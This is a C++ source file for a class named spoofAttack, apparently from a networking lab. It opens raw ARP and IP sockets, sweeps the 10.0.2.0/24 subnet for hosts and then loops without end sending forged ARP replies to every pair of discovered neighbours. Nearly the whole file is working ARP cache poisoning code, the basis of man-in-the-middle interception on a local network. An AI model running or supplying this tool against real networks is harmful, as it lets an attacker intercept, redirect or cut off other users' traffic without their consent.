#include <iostream>
#include <iomanip>
#include <string>
#include "../header/spoofAttack.h"

void spoofAttack::setupSocket(const char* interface) {

    uint32_t ifIP = util::getIPOfInterface(interface);
    std::array<uint8_t, 6> ifMac = util::getMacOfInterface(interface);
    
    std::cerr << "[INFO] setupSocket: interface " << interface << " has ip " << util::ipToString(ifIP) << " and mac " << util::macToString(ifMac.data()) << std::endl;
    
    arp = arpSocket();
    arp.createSocket(interface);
    arp.setSourceAddress(ifIP, ifMac);

    ip = ipSocket();
    ip.createSocket(interface);
    ip.setSourceAddress(ifIP, ifMac);
    
}

void spoofAttack::getNeighbours(uint32_t gatewayIP) {
    arp.setTimeout(0, 10000); // 0.01 sec
    std::cout << "Scanning neighbours";
    std::cout.flush();
    for(int i = 1; i <= 254; i++)
    {
        if(i % 25 == 0)
        {
            std::cout << ".";
            std::cout.flush();
        }
        std::string targetIp = "10.0.2." + std::to_string(i);
        std::array<uint8_t, 6> mac = arp.getMacAddress(targetIp.c_str(), 1);
        if(mac == std::array<uint8_t, 6>{0, 0, 0, 0, 0, 0})
        {
            continue;
        }
        IPToMac[util::stringToIp(targetIp.c_str())] = mac;
    }
    std::cout << " Done!" << std::endl;
    std::cout << "Available devices: \n"
        "---------------------\n" 
        "IP Address\tMAC Address\n"
        "---------------------" << std::endl;
    for(auto& it : IPToMac) {
        if(it.first == gatewayIP) {
            continue;
        }
        std::cout << util::ipToString(it.first) << "\t";
        for(int i = 0; i < 6; i++) {
            std::cout << std::setw(2) << std::setfill('0') << 
                std::hex << (int)it.second[i];
            if(i != 5) {
                std::cout << ":";
            }
        }
        std::cout << std::dec << std::endl;
    }
    std::cout << std::endl;
    arp.setTimeout(0, 0); // reset timeout
}

void spoofAttack::poisonNeighbours() {
    while(true) {
        // bool recv = false;
        // arpPacket request;
        // sockaddr_ll sll;
        // if(arp.getArpRequest(&request, &sll, true)) {
        //     uint32_t targetIp = request.targetIp;
        //     uint32_t senderIp = request.senderIp;
        //     std::cerr << "[INFO] poisonNeighbours: received arp request from " << util::ipToString(senderIp) << " for " << util::ipToString(targetIp) << std::endl;
        //     for(int i = 0; i < 100; i++)
        //     {
        //         arp.sendArpReply(&request, &sll);
        //         usleep(100000); // 0.1 sec
        //     }
        // }

        if(IPToMac.size() == 0) {
            std::cerr << "[WARN] poisonNeighbours: no neighbours found" << std::endl;
            return;
        }
        for(auto& it : IPToMac) {
            for(auto& target : IPToMac) {
                if(it.first == target.first) {
                    continue;
                }
                // std::cerr << "[INFO] poisonNeighbours: sending arp reply to " << util::ipToString(it.first) << " for " << util::ipToString(target.first) << std::endl;
                arp.sendArpReply(target.second, target.first, it.first);
            }
        }
        sleep(1);
    }
}